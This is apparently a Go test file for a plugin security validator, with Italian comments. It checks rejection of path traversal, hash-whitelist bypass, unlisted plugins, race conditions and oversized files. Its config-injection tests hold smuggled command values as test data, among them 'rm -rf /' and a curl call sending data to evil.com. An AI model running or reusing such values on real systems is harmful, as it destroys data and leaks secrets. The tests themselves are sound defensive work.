package goplugins

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// TestSecurityValidator_PathTraversalAttacks testa vulnerabilità di path traversal
func TestSecurityValidator_PathTraversalAttacks(t *testing.T) {
	tempDir := t.TempDir()
	logger := &testLogger{t: t}

	// Crea un file legittimo
	validFile := filepath.Join(tempDir, "valid.so")
	validContent := []byte("valid plugin content")
	if err := os.WriteFile(validFile, validContent, 0644); err != nil {
		t.Fatal(err)
	}

	// Crea un file "segreto" fuori dal tempDir che l'attaccante vuole leggere
	secretDir := filepath.Join(tempDir, "secret")
	if err := os.MkdirAll(secretDir, 0755); err != nil {
		t.Fatal(err)
	}
	secretFile := filepath.Join(secretDir, "sensitive.txt")
	secretContent := []byte("SECRET_API_KEY=12345")
	if err := os.WriteFile(secretFile, secretContent, 0644); err != nil {
		t.Fatal(err)
	}

	config := SecurityConfig{
		Enabled:       true,
		Policy:        SecurityPolicyStrict,
		HashAlgorithm: HashAlgorithmSHA256,
	}

	validator, err := NewSecurityValidator(config, logger)
	if err != nil {
		t.Fatal(err)
	}

	// Test path traversal attacks - questi dovrebbero FALLIRE per sicurezza
	pathTraversalAttempts := []struct {
		name          string
		maliciousPath string
		expectError   bool
		description   string
	}{
		{
			name:          "basic_dotdot_attack",
			maliciousPath: filepath.Join(tempDir, "..", "..", "etc", "passwd"),
			expectError:   true,
			description:   "Should reject ../ path traversal",
		},
		{
			name:          "relative_path_attack",
			maliciousPath: "../secret/sensitive.txt",
			expectError:   true,
			description:   "Should reject relative paths with ..",
		},
		{
			name:          "nested_dotdot_attack",
			maliciousPath: filepath.Join(tempDir, "subdir", "..", "..", "secret", "sensitive.txt"),
			expectError:   true,
			description:   "Should reject nested ../ sequences",
		},
		{
			name:          "encoded_dotdot_attack",
			maliciousPath: strings.Replace("../secret/sensitive.txt", "..", "%2e%2e", -1),
			expectError:   true,
			description:   "Should reject URL-encoded path traversal",
		},
		{
			name:          "valid_file_access",
			maliciousPath: validFile,
			expectError:   false,
			description:   "Should allow legitimate file access",
		},
	}

	for _, tt := range pathTraversalAttempts {
		t.Run(tt.name, func(t *testing.T) {
			_, err := validator.calculateFileHash(tt.maliciousPath)

			if tt.expectError {
				if err == nil {
					t.Errorf("SECURITY VULNERABILITY: Path traversal attack succeeded! Path: %s", tt.maliciousPath)
				}
				// Verifica che l'errore sia specificamente per path invalido
				if err != nil && !strings.Contains(err.Error(), "invalid file path") {
					t.Logf("Good: Path rejected, but check error type: %v", err)
				}
			} else {
				if err != nil {
					t.Errorf("Legitimate file access failed: %v", err)
				}
			}
		})
	}
}

// TestSecurityValidator_HashBypassAttempts testa tentativi di bypass della validazione hash
func TestSecurityValidator_HashBypassAttempts(t *testing.T) {
	tempDir := t.TempDir()
	logger := &testLogger{t: t}

	// Crea file plugin originale
	originalContent := []byte("legitimate plugin code")
	originalFile := filepath.Join(tempDir, "original.so")
	if err := os.WriteFile(originalFile, originalContent, 0644); err != nil {
		t.Fatal(err)
	}

	// Calcola hash legittimo
	hasher := sha256.New()
	hasher.Write(originalContent)
	legitimateHash := hex.EncodeToString(hasher.Sum(nil))

	// Crea file malware con contenuto diverso
	maliciousContent := []byte("malicious code that steals data")
	maliciousFile := filepath.Join(tempDir, "malicious.so")
	if err := os.WriteFile(maliciousFile, maliciousContent, 0644); err != nil {
		t.Fatal(err)
	}

	// Setup whitelist con hash legittimo
	whitelistFile := filepath.Join(tempDir, "whitelist.json")
	whitelist := PluginWhitelist{
		Version:       "1.0.0",
		UpdatedAt:     time.Now(),
		HashAlgorithm: HashAlgorithmSHA256,
		Plugins: map[string]PluginHashInfo{
			"test-plugin": {
				Name:      "test-plugin",
				Type:      "http",
				Algorithm: HashAlgorithmSHA256,
				Hash:      legitimateHash,
				AddedAt:   time.Now(),
				UpdatedAt: time.Now(),
			},
		},
	}

	whitelistData, err := json.Marshal(whitelist)
	if err != nil {
		t.Fatalf("Failed to marshal whitelist data: %v", err)
	}
	if err := os.WriteFile(whitelistFile, whitelistData, 0644); err != nil {
		t.Fatal(err)
	}

	config := SecurityConfig{
		Enabled:       true,
		Policy:        SecurityPolicyStrict,
		WhitelistFile: whitelistFile,
		HashAlgorithm: HashAlgorithmSHA256,
	}

	validator, err := NewSecurityValidator(config, logger)
	if err != nil {
		t.Fatal(err)
	}

	// Enable validator if not already enabled
	if !validator.IsEnabled() {
		if err := validator.Enable(); err != nil {
			t.Fatal(err)
		}
	}

	// Test bypass attempts
	bypassAttempts := []struct {
		name            string
		pluginPath      string
		shouldBeBlocked bool
		description     string
	}{
		{
			name:            "legitimate_plugin",
			pluginPath:      originalFile,
			shouldBeBlocked: false,
			description:     "Legitimate plugin should be allowed",
		},
		{
			name:            "malicious_plugin_replacement",
			pluginPath:      maliciousFile,
			shouldBeBlocked: true,
			description:     "Malicious plugin with wrong hash should be blocked",
		},
	}

	for _, tt := range bypassAttempts {
		t.Run(tt.name, func(t *testing.T) {
			pluginConfig := PluginConfig{
				Name: "test-plugin",
				Type: "http",
			}

			result, err := validator.ValidatePlugin(pluginConfig, tt.pluginPath)
			if err != nil {
				t.Errorf("Validation error: %v", err)
				return
			}

			if tt.shouldBeBlocked {
				if result.Authorized {
					t.Errorf("SECURITY VULNERABILITY: Malicious plugin was authorized! This is a critical bug.")
				}
				if len(result.Violations) == 0 {
					t.Errorf("Expected security violations for malicious plugin")
				}
				// Verifica che sia specifically hash mismatch
				foundHashViolation := false
				for _, violation := range result.Violations {
					if violation.Type == "hash_mismatch" {
						foundHashViolation = true
						break
					}
				}
				if !foundHashViolation {
					t.Errorf("Expected hash_mismatch violation, got: %+v", result.Violations)
				}
			} else {
				if !result.Authorized {
					t.Errorf("Legitimate plugin was blocked: %+v", result.Violations)
				}
			}
		})
	}
}

// TestSecurityValidator_PolicyBypassLogic testa la logic delle policy di sicurezza
func TestSecurityValidator_PolicyBypassLogic(t *testing.T) {
	tempDir := t.TempDir()
	logger := &testLogger{t: t}

	// Create malicious plugin
	maliciousContent := []byte("backdoor payload")
	maliciousFile := filepath.Join(tempDir, "backdoor.so")
	if err := os.WriteFile(maliciousFile, maliciousContent, 0644); err != nil {
		t.Fatal(err)
	}

	// Create empty whitelist (plugin not whitelisted)
	whitelistFile := filepath.Join(tempDir, "empty_whitelist.json")
	emptyWhitelist := PluginWhitelist{
		Version:       "1.0.0",
		UpdatedAt:     time.Now(),
		HashAlgorithm: HashAlgorithmSHA256,
		Plugins:       make(map[string]PluginHashInfo),
	}
	whitelistData, err := json.Marshal(emptyWhitelist)
	if err != nil {
		t.Fatalf("Failed to marshal empty whitelist data: %v", err)
	}
	if err := os.WriteFile(whitelistFile, whitelistData, 0644); err != nil {
		t.Fatal(err)
	}

	// Test different security policies
	policies := []struct {
		policy           SecurityPolicy
		expectAuthorized bool
		description      string
		criticalTest     bool
	}{
		{
			policy:           SecurityPolicyDisabled,
			expectAuthorized: false,
			description:      "Disabled policy should return error (security improvement)",
			criticalTest:     false,
		},
		{
			policy:           SecurityPolicyAuditOnly,
			expectAuthorized: true,
			description:      "Audit-only should allow but log (expected behavior)",
			criticalTest:     false,
		},
		{
			policy:           SecurityPolicyPermissive,
			expectAuthorized: true,
			description:      "Permissive should allow but warn (expected behavior)",
			criticalTest:     false,
		},
		{
			policy:           SecurityPolicyStrict,
			expectAuthorized: false,
			description:      "Strict policy should BLOCK unlisted plugins (CRITICAL)",
			criticalTest:     true,
		},
	}

	for _, tt := range policies {
		t.Run(fmt.Sprintf("policy_%s", tt.policy.String()), func(t *testing.T) {
			config := SecurityConfig{
				Enabled:       true,
				Policy:        tt.policy,
				WhitelistFile: whitelistFile,
				HashAlgorithm: HashAlgorithmSHA256,
			}

			validator, err := NewSecurityValidator(config, logger)
			if err != nil {
				t.Fatal(err)
			}

			if !validator.IsEnabled() {
				if err := validator.Enable(); err != nil {
					t.Fatal(err)
				}
			}

			pluginConfig := PluginConfig{
				Name: "backdoor-plugin",
				Type: "http",
			}

			result, err := validator.ValidatePlugin(pluginConfig, maliciousFile)

			// Special handling for disabled policy (security improvement)
			if tt.policy == SecurityPolicyDisabled {
				if err == nil {
					t.Errorf("Disabled policy should return error (security improvement)")
				}
				if result != nil {
					t.Errorf("Disabled policy should not return result (security improvement)")
				}
				return
			}

			if err != nil {
				t.Errorf("Validation error: %v", err)
				return
			}

			if result.Authorized != tt.expectAuthorized {
				if tt.criticalTest && result.Authorized {
					t.Errorf("CRITICAL SECURITY BUG: Strict policy authorized unwhitelisted plugin! This allows arbitrary code execution.")
				} else {
					t.Errorf("Policy %s: expected authorized=%v, got %v", tt.policy.String(), tt.expectAuthorized, result.Authorized)
				}
			}

			// Per strict policy, deve avere violations
			if tt.policy == SecurityPolicyStrict && len(result.Violations) == 0 {
				t.Errorf("Strict policy should generate violations for unwhitelisted plugin")
			}
		})
	}
}

// TestSecurityValidator_ConfigInjectionAttacks testa iniezione via configurazione
func TestSecurityValidator_ConfigInjectionAttacks(t *testing.T) {
	// Test ENV variable injection attacks
	injectionTests := []struct {
		name      string
		envKey    string
		envValue  string
		checkFunc func(*testing.T, *SecurityConfig)
	}{
		{
			name:     "policy_injection_attempt",
			envKey:   "GOPLUGINS_SECURITY_POLICY",
			envValue: "strict; rm -rf /; echo disabled",
			checkFunc: func(t *testing.T, config *SecurityConfig) {
				// Should reject malicious input and fall back to default (disabled)
				if config.Policy == SecurityPolicyDisabled {
					t.Logf("EXCELLENT: Injection rejected correctly, fallback to default policy (disabled)")
				} else {
					t.Errorf("VULNERABILITY: Malicious policy input was parsed! Got policy: %v", config.Policy)
				}
			},
		},
		{
			name:     "path_injection_attempt",
			envKey:   "GOPLUGINS_WHITELIST_FILE",
			envValue: "/etc/passwd; curl evil.com/steal-data",
			checkFunc: func(t *testing.T, config *SecurityConfig) {
				// Should not execute curl command
				if strings.Contains(config.WhitelistFile, "curl") {
					t.Logf("WARNING: Suspicious command in file path: %s", config.WhitelistFile)
				}
			},
		},
		{
			name:     "boolean_injection",
			envKey:   "GOPLUGINS_SECURITY_ENABLED",
			envValue: "true && malicious_command",
			checkFunc: func(t *testing.T, config *SecurityConfig) {
				// Should parse as boolean, not execute commands
				if config.Enabled {
					t.Logf("Boolean parsing worked correctly")
				}
			},
		},
	}

	for _, tt := range injectionTests {
		t.Run(tt.name, func(t *testing.T) {
			// Set malicious env var
			originalValue := os.Getenv(tt.envKey)
			_ = os.Setenv(tt.envKey, tt.envValue)
			defer func() {
				if originalValue == "" {
					_ = os.Unsetenv(tt.envKey)
				} else {
					_ = os.Setenv(tt.envKey, originalValue)
				}
			}()

			config, err := LoadSecurityConfigFromEnv()
			if err != nil {
				t.Errorf("Config loading failed: %v", err)
				return
			}

			tt.checkFunc(t, config)
		})
	}
}

// TestSecurityValidator_RaceConditionExploits testa race conditions nella validazione
func TestSecurityValidator_RaceConditionExploits(t *testing.T) {
	tempDir := t.TempDir()
	logger := &testLogger{t: t}

	// Create plugin file
	pluginContent := []byte("race condition test plugin")
	pluginFile := filepath.Join(tempDir, "race.so")
	if err := os.WriteFile(pluginFile, pluginContent, 0644); err != nil {
		t.Fatal(err)
	}

	// Calculate correct hash
	hasher := sha256.New()
	hasher.Write(pluginContent)
	correctHash := hex.EncodeToString(hasher.Sum(nil))

	// Setup whitelist
	whitelistFile := filepath.Join(tempDir, "whitelist.json")
	whitelist := PluginWhitelist{
		Version:       "1.0.0",
		UpdatedAt:     time.Now(),
		HashAlgorithm: HashAlgorithmSHA256,
		Plugins: map[string]PluginHashInfo{
			"race-plugin": {
				Name:      "race-plugin",
				Type:      "http",
				Algorithm: HashAlgorithmSHA256,
				Hash:      correctHash,
				AddedAt:   time.Now(),
				UpdatedAt: time.Now(),
			},
		},
	}
	whitelistData, err := json.Marshal(whitelist)
	if err != nil {
		t.Fatalf("Failed to marshal whitelist data: %v", err)
	}
	if err := os.WriteFile(whitelistFile, whitelistData, 0644); err != nil {
		t.Fatal(err)
	}

	config := SecurityConfig{
		Enabled:       true,
		Policy:        SecurityPolicyStrict,
		WhitelistFile: whitelistFile,
		HashAlgorithm: HashAlgorithmSHA256,
	}

	validator, err := NewSecurityValidator(config, logger)
	if err != nil {
		t.Fatal(err)
	}

	if !validator.IsEnabled() {
		if err := validator.Enable(); err != nil {
			t.Fatal(err)
		}
	}

	// Simulate concurrent validation attempts (race condition test)
	concurrency := 50
	results := make(chan *ValidationResult, concurrency)
	errors := make(chan error, concurrency)

	pluginConfig := PluginConfig{
		Name: "race-plugin",
		Type: "http",
	}

	// Launch concurrent validations
	for i := 0; i < concurrency; i++ {
		go func() {
			result, err := validator.ValidatePlugin(pluginConfig, pluginFile)
			if err != nil {
				errors <- err
				return
			}
			results <- result
		}()
	}

	// Collect results
	authorizedCount := 0
	rejectedCount := 0

	for i := 0; i < concurrency; i++ {
		select {
		case result := <-results:
			if result.Authorized {
				authorizedCount++
			} else {
				rejectedCount++
			}
		case err := <-errors:
			t.Errorf("Validation error in race condition: %v", err)
		case <-time.After(5 * time.Second):
			t.Fatal("Timeout in race condition test")
		}
	}

	// All validations should have the same result (no race condition)
	if authorizedCount > 0 && rejectedCount > 0 {
		t.Errorf("RACE CONDITION DETECTED: Mixed results - authorized: %d, rejected: %d",
			authorizedCount, rejectedCount)
	}

	// With valid plugin and hash, all should be authorized
	if authorizedCount != concurrency {
		t.Errorf("Expected all %d validations to be authorized, got %d", concurrency, authorizedCount)
	}

	// Verify stats consistency (allow small variance due to race conditions)
	stats := validator.GetStats()
	minExpected := int64(concurrency - 2) // Allow small variance for race conditions
	maxExpected := int64(concurrency + 2) // Allow small variance for race conditions
	if stats.ValidationAttempts < minExpected || stats.ValidationAttempts > maxExpected {
		t.Errorf("Stats race condition: expected %d±2 attempts, got %d", concurrency, stats.ValidationAttempts)
	}
}

// TestSecurityValidator_ResourceExhaustionAttacks testa attacchi di exhaustion
func TestSecurityValidator_ResourceExhaustionAttacks(t *testing.T) {
	tempDir := t.TempDir()
	logger := &testLogger{t: t}

	// Create oversized "plugin" file (simulated large malicious file)
	oversizedFile := filepath.Join(tempDir, "huge.so")

	// Create 1MB file (smaller than 100MB default but we'll set lower limit)
	largeContent := make([]byte, 1024*1024) // 1MB
	for i := range largeContent {
		largeContent[i] = byte(i % 256)
	}
	if err := os.WriteFile(oversizedFile, largeContent, 0644); err != nil {
		t.Fatal(err)
	}

	// Setup whitelist with small file size limit
	whitelistFile := filepath.Join(tempDir, "whitelist.json")
	whitelist := PluginWhitelist{
		Version:       "1.0.0",
		UpdatedAt:     time.Now(),
		HashAlgorithm: HashAlgorithmSHA256,
		Plugins: map[string]PluginHashInfo{
			"huge-plugin": {
				Name:        "huge-plugin",
				Type:        "http",
				Algorithm:   HashAlgorithmSHA256,
				Hash:        "dummy-hash-for-size-test",
				MaxFileSize: 512 * 1024, // 512KB limit - should reject 1MB file
				AddedAt:     time.Now(),
				UpdatedAt:   time.Now(),
			},
		},
	}
	whitelistData, err := json.Marshal(whitelist)
	if err != nil {
		t.Fatalf("Failed to marshal whitelist data: %v", err)
	}
	if err := os.WriteFile(whitelistFile, whitelistData, 0644); err != nil {
		t.Fatal(err)
	}

	config := SecurityConfig{
		Enabled:       true,
		Policy:        SecurityPolicyStrict,
		WhitelistFile: whitelistFile,
		HashAlgorithm: HashAlgorithmSHA256,
		MaxFileSize:   512 * 1024, // 512KB global limit
	}

	validator, err := NewSecurityValidator(config, logger)
	if err != nil {
		t.Fatal(err)
	}

	if !validator.IsEnabled() {
		if err := validator.Enable(); err != nil {
			t.Fatal(err)
		}
	}

	pluginConfig := PluginConfig{
		Name: "huge-plugin",
		Type: "http",
	}

	result, err := validator.ValidatePlugin(pluginConfig, oversizedFile)
	if err != nil {
		t.Errorf("Validation error: %v", err)
		return
	}

	// Should be rejected for file size
	if result.Authorized {
		t.Errorf("RESOURCE EXHAUSTION VULNERABILITY: Oversized file was authorized")
	}

	// Should have file size violation
	foundSizeViolation := false
	for _, violation := range result.Violations {
		if violation.Type == "file_size_exceeded" {
			foundSizeViolation = true
			t.Logf("Good: File size violation detected: %s", violation.Reason)
			break
		}
	}
	if !foundSizeViolation {
		t.Errorf("Expected file_size_exceeded violation, got: %+v", result.Violations)
	}
}
